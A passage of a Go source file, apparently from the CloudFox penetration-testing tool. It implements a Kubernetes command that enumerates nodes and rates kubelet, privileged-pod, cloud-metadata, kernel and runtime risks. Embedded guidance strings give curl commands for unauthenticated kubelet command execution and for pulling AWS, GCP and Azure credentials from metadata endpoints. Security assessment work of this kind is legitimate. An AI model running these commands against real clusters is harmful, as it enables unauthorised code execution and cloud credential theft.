package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	netv1 "k8s.io/api/networking/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/client-go/kubernetes"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

var NodesCmd = &cobra.Command{
	Use:     "nodes",
	Aliases: []string{},
	Short:   "List all cluster nodes with comprehensive security analysis",
	Long: `
List all cluster nodes with detailed security information including:
- Kubelet security vulnerabilities (anonymous auth, read-only port, CVEs)
- Privileged workload analysis (container escape risks)
- Cloud metadata (IMDS) access risks
- Kernel and OS vulnerability detection
- Resource pressure and node conditions
- Network exposure analysis
- Complete attack path visualization

Usage:
  cloudfox kubernetes nodes`,
	Run: ListNodes,
}

type NodesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t NodesOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t NodesOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

// NodeFinding represents comprehensive security analysis for a node
type NodeFinding struct {
	// Basic info
	Name       string
	InternalIP string
	ExternalIP string
	Hostname   string

	// Node specifications
	OSImage          string
	KernelVersion    string
	ContainerRuntime string
	KubeletVersion   string
	KubeProxyVersion string
	Architecture     string

	// Cloud provider
	CloudProvider   string
	CloudRole       string
	CloudInstanceID string
	CloudZone       string
	CloudRegion     string

	// Security analysis
	RiskLevel             string
	SecurityIssues        []string
	Vulnerabilities       []string
	MisconfigurationTypes []string

	// Kubelet security
	KubeletReadOnlyPort      int32
	KubeletAnonymousAuth     bool
	KubeletAuthorizationMode string
	KubeletSecurityIssues    []string
	KubeletRiskLevel         string

	// Node conditions
	NodeConditions        []string
	HasDiskPressure       bool
	HasMemoryPressure     bool
	HasPIDPressure        bool
	HasNetworkUnavailable bool
	IsReady               bool
	ConditionIssues       []string

	// Resource analysis
	CPUCapacity       string
	MemoryCapacity    string
	CPUAllocatable    string
	MemoryAllocatable string
	PodsCapacity      int64
	PodsAllocatable   int64
	CurrentPods       int
	ResourcePressure  string

	// Privileged workload analysis
	PrivilegedPods         int
	HostNetworkPods        int
	HostPIDPods            int
	HostIPCPods            int
	HostPathPods           int
	PrivilegedPodNames     []string
	DangerousHostPaths     []string
	PrivilegedWorkloadRisk string

	// Cloud metadata security
	IMDSAccessRisk      string
	MetadataEndpoint    string
	IAMRoleAttached     bool
	CloudSecurityIssues []string

	// Network exposure
	IsExternallyExposed   bool
	ExposureRisk          string
	NetworkSecurityIssues []string

	// Taints and labels
	Taints      []string
	Labels      map[string]string
	Annotations map[string]string

	// Attack scenarios
	AllowsPodEscape       bool
	AllowsNodeTakeover    bool
	AllowsCloudBreakout   bool
	AllowsLateralMovement bool
	AttackPaths           []string
}

// KubeletSecurityAnalysis tracks kubelet-specific security issues
type KubeletSecurityAnalysis struct {
	NodeName             string
	KubeletVersion       string
	AnonymousAuth        bool
	ReadOnlyPort         int32
	AuthorizationMode    string
	SecurityIssues       []string
	Vulnerabilities      []string
	RiskLevel            string
	ExploitationGuidance string
}

// ResourceAnalysis tracks node resource conditions and pressure
type ResourceAnalysis struct {
	NodeName          string
	CPUCapacity       resource.Quantity
	MemoryCapacity    resource.Quantity
	CPUAllocatable    resource.Quantity
	MemoryAllocatable resource.Quantity
	PodsCapacity      int64
	PodsAllocatable   int64
	CurrentPods       int
	HasDiskPressure   bool
	HasMemoryPressure bool
	HasPIDPressure    bool
	IsReady           bool
	ResourcePressure  string
	Issues            []string
}

// PrivilegedWorkloadAnalysis tracks privileged workloads per node
type PrivilegedWorkloadAnalysis struct {
	NodeName            string
	PrivilegedPods      int
	HostNetworkPods     int
	HostPIDPods         int
	HostIPCPods         int
	HostPathPods        int
	PrivilegedPodNames  []string
	HostNetworkPodNames []string
	HostPIDPodNames     []string
	HostIPCPodNames     []string
	DangerousHostPaths  []string
	RiskLevel           string
	SecurityIssues      []string
	ContainerEscapeRisk bool
}

// IMDSRiskAnalysis tracks cloud metadata access risks
type IMDSRiskAnalysis struct {
	NodeName         string
	CloudProvider    string
	MetadataEndpoint string
	IAMRoleAttached  bool
	HasIMDSPolicy    bool
	RiskLevel        string
	SecurityIssues   []string
	ExploitGuidance  string
}

// KernelVulnerabilityAnalysis tracks kernel/OS vulnerabilities
type KernelVulnerabilityAnalysis struct {
	NodeName         string
	KernelVersion    string
	OSImage          string
	ContainerRuntime string
	Vulnerabilities  []string
	RiskLevel        string
	PatchGuidance    string
}

// Kubelet vulnerability database
var kubeletVulnerabilities = map[string][]string{
	"1.10": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.11": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.12": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.13": {"CVE-2019-11253 - XML bomb DoS", "CVE-2019-1002101 - kubectl cp symlink vulnerability"},
	"1.14": {"CVE-2019-11253 - XML bomb DoS", "CVE-2019-11247 - API server access control bypass"},
	"1.15": {"CVE-2019-11253 - XML bomb DoS", "CVE-2020-8555 - SSRF in kube-controller-manager"},
	"1.16": {"CVE-2020-8555 - SSRF in kube-controller-manager", "CVE-2020-8559 - Privilege escalation"},
	"1.17": {"CVE-2020-8555 - SSRF in kube-controller-manager", "CVE-2020-8559 - Privilege escalation"},
	"1.18": {"CVE-2020-8559 - Privilege escalation", "CVE-2021-25741 - Symlink exchange vulnerability"},
	"1.19": {"CVE-2021-25741 - Symlink exchange vulnerability"},
	"1.20": {"CVE-2021-25741 - Symlink exchange vulnerability"},
}

// Kernel vulnerability database
var vulnerableKernels = []struct {
	Name        string
	CVE         string
	Versions    []string
	Description string
}{
	{
		Name:        "DirtyCOW",
		CVE:         "CVE-2016-5195",
		Versions:    []string{"4.8.0", "4.7.0", "4.6.0", "4.4.0", "3."},
		Description: "Race condition in memory subsystem - privilege escalation to root",
	},
	{
		Name:        "DirtyPipe",
		CVE:         "CVE-2022-0847",
		Versions:    []string{"5.16.", "5.15.", "5.14.", "5.13.", "5.10."},
		Description: "Arbitrary file overwrite - privilege escalation to root",
	},
	{
		Name:        "OverlayFS",
		CVE:         "CVE-2021-3493",
		Versions:    []string{"4.4.0", "4.15.0", "5.4.0"},
		Description: "Ubuntu OverlayFS vulnerability - privilege escalation to root",
	},
	{
		Name:        "Netfilter",
		CVE:         "CVE-2021-22555",
		Versions:    []string{"5.4.", "5.3.", "5.2.", "5.1.", "5.0.", "4.19.", "4.18.", "4.17.", "4.16.", "4.15.", "4.14."},
		Description: "Netfilter heap out-of-bounds write - privilege escalation",
	},
}

// EOL operating systems
var eolOperatingSystems = map[string]string{
	"Ubuntu 16.04": "2021-04-30",
	"Ubuntu 18.04": "2023-04-30",
	"CentOS 7":     "2024-06-30",
	"CentOS 8":     "2021-12-31",
	"Debian 9":     "2022-06-30",
	"Debian 10":    "2024-06-30",
	"CoreOS":       "2020-05-26",
}

// Container runtime vulnerabilities
var runtimeVulnerabilities = []struct {
	Runtime     string
	CVE         string
	Versions    []string
	Description string
}{
	{
		Runtime:     "runc",
		CVE:         "CVE-2019-5736",
		Versions:    []string{"1.0-rc6", "1.0-rc5", "1.0-rc4", "1.0-rc3"},
		Description: "Container breakout via /proc/self/exe - host root access",
	},
	{
		Runtime:     "containerd",
		CVE:         "CVE-2020-15257",
		Versions:    []string{"1.3.0", "1.3.1", "1.3.2", "1.3.3", "1.3.4", "1.3.5", "1.3.6", "1.3.7", "1.3.8", "1.3.9"},
		Description: "Access to abstract Unix domain socket - container escape",
	},
	{
		Runtime:     "docker",
		CVE:         "CVE-2019-14271",
		Versions:    []string{"18.09.0", "18.09.1", "18.09.2", "18.09.3", "18.09.4", "18.09.5", "18.09.6", "18.09.7"},
		Description: "Docker cp command symlink-exchange attack",
	},
}

func ListNodes(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating nodes for %s with comprehensive security analysis", globals.ClusterName), globals.K8S_NODES_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Fetch all nodes
	nodes, err := clientset.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "nodes", "", err, globals.K8S_NODES_MODULE_NAME, true)
		return
	}

	// Fetch all pods for workload analysis
	pods, err := clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "pods", "", err, globals.K8S_NODES_MODULE_NAME, true)
		return
	}

	// Fetch all network policies for IMDS analysis
	networkPolicies, err := clientset.NetworkingV1().NetworkPolicies("").List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "network policies", "", err, globals.K8S_NODES_MODULE_NAME, false)
		networkPolicies = &netv1.NetworkPolicyList{} // Continue without network policies
	}

	// Create node findings with comprehensive security analysis
	var findings []NodeFinding

	for _, node := range nodes.Items {
		finding := analyzeNode(ctx, clientset, node, pods.Items, networkPolicies.Items)
		findings = append(findings, finding)
	}

	// Generate all outputs
	tableFile := generateNodesTable(findings)
	lootFiles := generateNodesLootFiles(findings).Build()

	// Handle output
	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Nodes",
		globals.ClusterName,
		"results",
		NodesOutput{
			Table: []internal.TableFile{tableFile},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_NODES_MODULE_NAME)
		return
	}

	// Summary statistics
	criticalCount := 0
	highCount := 0
	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" {
			criticalCount++
		} else if f.RiskLevel == "HIGH" {
			highCount++
		}
	}

	if len(findings) > 0 {
		logger.InfoM(fmt.Sprintf("%d nodes found (%d CRITICAL, %d HIGH risk)", len(findings), criticalCount, highCount), globals.K8S_NODES_MODULE_NAME)
	} else {
		logger.InfoM("No nodes found, skipping output file creation", globals.K8S_NODES_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_NODES_MODULE_NAME), globals.K8S_NODES_MODULE_NAME)
}

// analyzeNode performs comprehensive security analysis on a node
func analyzeNode(ctx context.Context, clientset *kubernetes.Clientset, node corev1.Node, allPods []corev1.Pod, networkPolicies []netv1.NetworkPolicy) NodeFinding {
	finding := NodeFinding{
		Name:        node.Name,
		Labels:      node.Labels,
		Annotations: node.Annotations,
	}

	// Basic node information
	for _, addr := range node.Status.Addresses {
		switch addr.Type {
		case corev1.NodeInternalIP:
			finding.InternalIP = addr.Address
		case corev1.NodeExternalIP:
			finding.ExternalIP = addr.Address
		case corev1.NodeHostName:
			finding.Hostname = addr.Address
		}
	}

	finding.OSImage = node.Status.NodeInfo.OSImage
	finding.KernelVersion = node.Status.NodeInfo.KernelVersion
	finding.ContainerRuntime = node.Status.NodeInfo.ContainerRuntimeVersion
	finding.KubeletVersion = node.Status.NodeInfo.KubeletVersion
	finding.KubeProxyVersion = node.Status.NodeInfo.KubeProxyVersion
	finding.Architecture = node.Status.NodeInfo.Architecture

	// Cloud provider detection
	finding.CloudProvider = k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
	finding.CloudRole = k8sinternal.DetectCloudRoleFromNodeLabels(node.Labels)
	finding.CloudInstanceID = node.Spec.ProviderID

	// Extract zone and region from labels
	if zone, ok := node.Labels["topology.kubernetes.io/zone"]; ok {
		finding.CloudZone = zone
	} else if zone, ok := node.Labels["failure-domain.beta.kubernetes.io/zone"]; ok {
		finding.CloudZone = zone
	}

	if region, ok := node.Labels["topology.kubernetes.io/region"]; ok {
		finding.CloudRegion = region
	} else if region, ok := node.Labels["failure-domain.beta.kubernetes.io/region"]; ok {
		finding.CloudRegion = region
	}

	// Taints
	for _, t := range node.Spec.Taints {
		finding.Taints = append(finding.Taints, fmt.Sprintf("%s=%s:%s", t.Key, t.Value, t.Effect))
	}

	// Filter pods running on this node
	var nodePods []corev1.Pod
	for _, pod := range allPods {
		if pod.Spec.NodeName == node.Name {
			nodePods = append(nodePods, pod)
		}
	}

	// Perform security analyses
	kubeletAnalysis := analyzeKubeletSecurity(node)
	resourceAnalysis := analyzeNodeResources(node, nodePods)
	privilegedAnalysis := analyzePrivilegedWorkloads(node, nodePods)
	imdsAnalysis := analyzeIMDSRisk(node, nodePods, networkPolicies)
	kernelAnalysis := analyzeKernelVulnerabilities(node)
	networkAnalysis := analyzeNodeNetworkExposure(node)

	// Populate finding from analyses
	finding.KubeletAnonymousAuth = kubeletAnalysis.AnonymousAuth
	finding.KubeletReadOnlyPort = kubeletAnalysis.ReadOnlyPort
	finding.KubeletAuthorizationMode = kubeletAnalysis.AuthorizationMode
	finding.KubeletSecurityIssues = kubeletAnalysis.SecurityIssues
	finding.KubeletRiskLevel = kubeletAnalysis.RiskLevel

	finding.HasDiskPressure = resourceAnalysis.HasDiskPressure
	finding.HasMemoryPressure = resourceAnalysis.HasMemoryPressure
	finding.HasPIDPressure = resourceAnalysis.HasPIDPressure
	finding.IsReady = resourceAnalysis.IsReady
	finding.ResourcePressure = resourceAnalysis.ResourcePressure
	finding.ConditionIssues = resourceAnalysis.Issues
	finding.CPUCapacity = resourceAnalysis.CPUCapacity.String()
	finding.MemoryCapacity = resourceAnalysis.MemoryCapacity.String()
	finding.CPUAllocatable = resourceAnalysis.CPUAllocatable.String()
	finding.MemoryAllocatable = resourceAnalysis.MemoryAllocatable.String()
	finding.PodsCapacity = resourceAnalysis.PodsCapacity
	finding.PodsAllocatable = resourceAnalysis.PodsAllocatable
	finding.CurrentPods = resourceAnalysis.CurrentPods

	finding.PrivilegedPods = privilegedAnalysis.PrivilegedPods
	finding.HostNetworkPods = privilegedAnalysis.HostNetworkPods
	finding.HostPIDPods = privilegedAnalysis.HostPIDPods
	finding.HostIPCPods = privilegedAnalysis.HostIPCPods
	finding.HostPathPods = privilegedAnalysis.HostPathPods
	finding.PrivilegedPodNames = privilegedAnalysis.PrivilegedPodNames
	finding.DangerousHostPaths = privilegedAnalysis.DangerousHostPaths
	finding.PrivilegedWorkloadRisk = privilegedAnalysis.RiskLevel
	finding.AllowsPodEscape = privilegedAnalysis.ContainerEscapeRisk

	finding.IMDSAccessRisk = imdsAnalysis.RiskLevel
	finding.MetadataEndpoint = imdsAnalysis.MetadataEndpoint
	finding.IAMRoleAttached = imdsAnalysis.IAMRoleAttached
	finding.CloudSecurityIssues = imdsAnalysis.SecurityIssues
	finding.AllowsCloudBreakout = (imdsAnalysis.RiskLevel == "CRITICAL" || imdsAnalysis.RiskLevel == "HIGH")

	finding.Vulnerabilities = append(finding.Vulnerabilities, kubeletAnalysis.Vulnerabilities...)
	finding.Vulnerabilities = append(finding.Vulnerabilities, kernelAnalysis.Vulnerabilities...)

	finding.IsExternallyExposed = networkAnalysis.IsExternallyExposed
	finding.ExposureRisk = networkAnalysis.RiskLevel
	finding.NetworkSecurityIssues = networkAnalysis.SecurityIssues

	// Attack scenarios
	if privilegedAnalysis.ContainerEscapeRisk {
		finding.AllowsPodEscape = true
	}

	if kubeletAnalysis.RiskLevel == "CRITICAL" {
		finding.AllowsNodeTakeover = true
	}

	if privilegedAnalysis.HostNetworkPods > 0 {
		finding.AllowsLateralMovement = true
	}

	// Build attack paths
	finding.AttackPaths = buildAttackPaths(finding, kubeletAnalysis, privilegedAnalysis, imdsAnalysis)

	// Aggregate all security issues
	finding.SecurityIssues = append(finding.SecurityIssues, kubeletAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, resourceAnalysis.Issues...)
	finding.SecurityIssues = append(finding.SecurityIssues, privilegedAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, imdsAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, networkAnalysis.SecurityIssues...)

	// Calculate overall risk level
	finding.RiskLevel = calculateNodeRiskLevel(finding, kubeletAnalysis, resourceAnalysis, privilegedAnalysis, imdsAnalysis, networkAnalysis)

	return finding
}

// analyzeKubeletSecurity checks for kubelet security issues
func analyzeKubeletSecurity(node corev1.Node) KubeletSecurityAnalysis {
	analysis := KubeletSecurityAnalysis{
		NodeName:       node.Name,
		KubeletVersion: node.Status.NodeInfo.KubeletVersion,
		RiskLevel:      "LOW",
	}

	// Check for anonymous authentication (most common in older clusters)
	// This is typically indicated by specific kubelet flags in node annotations
	if val, ok := node.Annotations["node.alpha.kubernetes.io/kubelet-config.yaml"]; ok {
		if strings.Contains(val, "anonymous-auth: true") || strings.Contains(val, "anonymous:\n  enabled: true") {
			analysis.AnonymousAuth = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Kubelet anonymous authentication enabled - allows unauthenticated RCE on port 10250")
			analysis.RiskLevel = "CRITICAL"
			analysis.ExploitationGuidance = fmt.Sprintf(
				"curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=id\"",
				getNodeIP(node))
		}
	}

	// Check for read-only port (10255)
	// In modern Kubernetes this is disabled by default, but check annotations
	if val, ok := node.Annotations["node.alpha.kubernetes.io/kubelet-config.yaml"]; ok {
		if strings.Contains(val, "read-only-port: 10255") || strings.Contains(val, "readOnlyPort: 10255") {
			analysis.ReadOnlyPort = 10255
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Kubelet read-only port 10255 exposed - pod specs and secrets readable without authentication")
			if analysis.RiskLevel != "CRITICAL" {
				analysis.RiskLevel = "HIGH"
			}
		}
	}

	// Check kubelet version for known CVEs
	kubeletVersion := node.Status.NodeInfo.KubeletVersion
	for versionPrefix, vulns := range kubeletVulnerabilities {
		if strings.HasPrefix(kubeletVersion, "v"+versionPrefix) {
			analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulns...)
			if analysis.RiskLevel == "LOW" {
				analysis.RiskLevel = "MEDIUM"
			}
		}
	}

	// Check authorization mode (if available)
	if val, ok := node.Annotations["kubeadm.alpha.kubernetes.io/cri-socket"]; ok {
		analysis.AuthorizationMode = val
	}

	return analysis
}

// analyzeNodeResources checks node resource conditions and pressure
func analyzeNodeResources(node corev1.Node, pods []corev1.Pod) ResourceAnalysis {
	analysis := ResourceAnalysis{
		NodeName:         node.Name,
		CurrentPods:      len(pods),
		ResourcePressure: "NONE",
	}

	// Parse resource quantities
	if cpu, ok := node.Status.Capacity[corev1.ResourceCPU]; ok {
		analysis.CPUCapacity = cpu
	}
	if memory, ok := node.Status.Capacity[corev1.ResourceMemory]; ok {
		analysis.MemoryCapacity = memory
	}
	if cpu, ok := node.Status.Allocatable[corev1.ResourceCPU]; ok {
		analysis.CPUAllocatable = cpu
	}
	if memory, ok := node.Status.Allocatable[corev1.ResourceMemory]; ok {
		analysis.MemoryAllocatable = memory
	}
	if podsCapacity, ok := node.Status.Capacity[corev1.ResourcePods]; ok {
		analysis.PodsCapacity = podsCapacity.Value()
	}
	if podsAllocatable, ok := node.Status.Allocatable[corev1.ResourcePods]; ok {
		analysis.PodsAllocatable = podsAllocatable.Value()
	}

	// Check node conditions
	for _, condition := range node.Status.Conditions {
		switch condition.Type {
		case corev1.NodeReady:
			if condition.Status == corev1.ConditionTrue {
				analysis.IsReady = true
			} else {
				analysis.Issues = append(analysis.Issues, "Node not ready")
			}
		case corev1.NodeDiskPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasDiskPressure = true
				analysis.Issues = append(analysis.Issues, "Disk pressure detected - potential DoS risk")
				analysis.ResourcePressure = "HIGH"
			}
		case corev1.NodeMemoryPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasMemoryPressure = true
				analysis.Issues = append(analysis.Issues, "Memory pressure detected - OOMKill risk")
				analysis.ResourcePressure = "HIGH"
			}
		case corev1.NodePIDPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasPIDPressure = true
				analysis.Issues = append(analysis.Issues, "PID pressure detected - fork bomb vulnerability")
				analysis.ResourcePressure = "CRITICAL"
			}
		case corev1.NodeNetworkUnavailable:
			if condition.Status == corev1.ConditionTrue {
				analysis.Issues = append(analysis.Issues, "Network unavailable")
			}
		}
	}

	// Check pod capacity
	if analysis.PodsCapacity > 0 {
		utilizationPercent := (int64(analysis.CurrentPods) * 100) / analysis.PodsCapacity
		if utilizationPercent > 90 {
			analysis.ResourcePressure = "CRITICAL"
			analysis.Issues = append(analysis.Issues, fmt.Sprintf("Pod capacity >90%% (%d/%d) - scheduling failures imminent", analysis.CurrentPods, analysis.PodsCapacity))
		} else if utilizationPercent > 80 {
			if analysis.ResourcePressure == "NONE" {
				analysis.ResourcePressure = "HIGH"
			}
			analysis.Issues = append(analysis.Issues, fmt.Sprintf("Pod capacity >80%% (%d/%d) - scheduling risk", analysis.CurrentPods, analysis.PodsCapacity))
		}
	}

	return analysis
}

// analyzePrivilegedWorkloads checks for privileged workloads on the node
func analyzePrivilegedWorkloads(node corev1.Node, pods []corev1.Pod) PrivilegedWorkloadAnalysis {
	analysis := PrivilegedWorkloadAnalysis{
		NodeName:  node.Name,
		RiskLevel: "NONE",
	}

	for _, pod := range pods {
		podFullName := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)

		// Check for privileged containers
		for _, container := range append(pod.Spec.Containers, pod.Spec.InitContainers...) {
			if container.SecurityContext != nil &&
				container.SecurityContext.Privileged != nil &&
				*container.SecurityContext.Privileged {
				analysis.PrivilegedPods++
				if !nodesContains(analysis.PrivilegedPodNames, podFullName) {
					analysis.PrivilegedPodNames = append(analysis.PrivilegedPodNames, podFullName)
				}
				analysis.ContainerEscapeRisk = true
			}
		}

		// Check for hostNetwork
		if pod.Spec.HostNetwork {
			analysis.HostNetworkPods++
			if !nodesContains(analysis.HostNetworkPodNames, podFullName) {
				analysis.HostNetworkPodNames = append(analysis.HostNetworkPodNames, podFullName)
			}
		}

		// Check for hostPID
		if pod.Spec.HostPID {
			analysis.HostPIDPods++
			if !nodesContains(analysis.HostPIDPodNames, podFullName) {
				analysis.HostPIDPodNames = append(analysis.HostPIDPodNames, podFullName)
			}
		}

		// Check for hostIPC
		if pod.Spec.HostIPC {
			analysis.HostIPCPods++
			if !nodesContains(analysis.HostIPCPodNames, podFullName) {
				analysis.HostIPCPodNames = append(analysis.HostIPCPodNames, podFullName)
			}
		}

		// Check for dangerous hostPath mounts
		for _, volume := range pod.Spec.Volumes {
			if volume.HostPath != nil {
				path := volume.HostPath.Path
				if isDangerousHostPath(path) {
					analysis.HostPathPods++
					dangerousPath := fmt.Sprintf("%s: %s", podFullName, path)
					if !nodesContains(analysis.DangerousHostPaths, dangerousPath) {
						analysis.DangerousHostPaths = append(analysis.DangerousHostPaths, dangerousPath)
					}
					analysis.ContainerEscapeRisk = true
				}
			}
		}
	}

	// Calculate risk level
	if analysis.PrivilegedPods > 0 {
		analysis.RiskLevel = "CRITICAL"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d privileged pods - container escape to node root possible", analysis.PrivilegedPods))
	}

	if len(analysis.DangerousHostPaths) > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "HIGH"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d pods with dangerous hostPath mounts - host filesystem access", len(analysis.DangerousHostPaths)))
	}

	if analysis.HostNetworkPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "MEDIUM"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostNetwork pods - network namespace escape and lateral movement", analysis.HostNetworkPods))
	}

	if analysis.HostPIDPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "MEDIUM"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostPID pods - PID namespace escape", analysis.HostPIDPods))
	}

	if analysis.HostIPCPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "LOW"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostIPC pods - IPC namespace escape", analysis.HostIPCPods))
	}

	return analysis
}

// analyzeIMDSRisk checks for cloud metadata access risks
func analyzeIMDSRisk(node corev1.Node, pods []corev1.Pod, networkPolicies []netv1.NetworkPolicy) IMDSRiskAnalysis {
	analysis := IMDSRiskAnalysis{
		NodeName:  node.Name,
		RiskLevel: "NONE",
	}

	cloudProvider := k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
	analysis.CloudProvider = cloudProvider

	switch cloudProvider {
	case "AWS":
		analysis.MetadataEndpoint = "169.254.169.254"

		// Check if IAM role is attached to node
		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"IAM role attached to node - pods can access AWS credentials via IMDS")
			analysis.ExploitGuidance = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
		}

	case "GCP":
		analysis.MetadataEndpoint = "metadata.google.internal"

		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Service account attached to node - pods can access GCP credentials via metadata server")
			analysis.ExploitGuidance = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
		}

	case "Azure":
		analysis.MetadataEndpoint = "169.254.169.254"

		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Managed identity attached to node - pods can access Azure credentials via IMDS")
			analysis.ExploitGuidance = "curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
		}
	}

	// Check if there's a network policy blocking IMDS access
	if analysis.IAMRoleAttached {
		hasIMDSPolicy := false
		for _, np := range networkPolicies {
			// Check if policy blocks egress to metadata endpoint
			for _, egressRule := range np.Spec.Egress {
				for _, to := range egressRule.To {
					if to.IPBlock != nil {
						// AWS/Azure IMDS
						if strings.HasPrefix(to.IPBlock.CIDR, "169.254.169.254") {
							// Check if it's a deny rule (has except clause)
							if len(to.IPBlock.Except) > 0 {
								hasIMDSPolicy = true
							}
						}
					}
				}
			}
		}

		analysis.HasIMDSPolicy = hasIMDSPolicy

		if !hasIMDSPolicy {
			analysis.RiskLevel = "CRITICAL"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"No network policy blocking IMDS - all pods can access cloud credentials and escalate to cloud admin")
		}
	}

	return analysis
}

// analyzeKernelVulnerabilities checks for kernel and OS vulnerabilities
func analyzeKernelVulnerabilities(node corev1.Node) KernelVulnerabilityAnalysis {
	analysis := KernelVulnerabilityAnalysis{
		NodeName:         node.Name,
		KernelVersion:    node.Status.NodeInfo.KernelVersion,
		OSImage:          node.Status.NodeInfo.OSImage,
		ContainerRuntime: node.Status.NodeInfo.ContainerRuntimeVersion,
		RiskLevel:        "LOW",
	}

	// Check for vulnerable kernels
	for _, vuln := range vulnerableKernels {
		for _, version := range vuln.Versions {
			if strings.Contains(analysis.KernelVersion, version) {
				vulnDetail := fmt.Sprintf("%s (%s) - %s", vuln.Name, vuln.CVE, vuln.Description)
				analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
				analysis.RiskLevel = "HIGH"
				analysis.PatchGuidance = "Update kernel to latest stable version"
			}
		}
	}

	// Check for EOL operating systems
	for osName, eolDate := range eolOperatingSystems {
		if strings.Contains(analysis.OSImage, osName) {
			vulnDetail := fmt.Sprintf("EOL operating system: %s (end-of-life: %s) - no security updates", osName, eolDate)
			analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
			if analysis.RiskLevel != "HIGH" {
				analysis.RiskLevel = "MEDIUM"
			}
			analysis.PatchGuidance = "Upgrade to supported OS version"
		}
	}

	// Check for container runtime vulnerabilities
	for _, vuln := range runtimeVulnerabilities {
		if strings.Contains(analysis.ContainerRuntime, vuln.Runtime) {
			for _, version := range vuln.Versions {
				if strings.Contains(analysis.ContainerRuntime, version) {
					vulnDetail := fmt.Sprintf("%s %s - %s", vuln.Runtime, vuln.CVE, vuln.Description)
					analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
					analysis.RiskLevel = "HIGH"
					analysis.PatchGuidance = "Update container runtime to latest version"
				}
			}
		}
	}

	return analysis
}

// analyzeNodeNetworkExposure checks for network exposure risks
func analyzeNodeNetworkExposure(node corev1.Node) struct {
	IsExternallyExposed bool
	RiskLevel           string
	SecurityIssues      []string
} {
	analysis := struct {
		IsExternallyExposed bool
		RiskLevel           string
		SecurityIssues      []string
	}{
		RiskLevel: "LOW",
	}

	// Check for external IP
	for _, addr := range node.Status.Addresses {
		if addr.Type == corev1.NodeExternalIP && addr.Address != "" {
			analysis.IsExternallyExposed = true
			analysis.RiskLevel = "MEDIUM"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				fmt.Sprintf("Node has external IP %s - direct internet exposure", addr.Address))
		}
	}

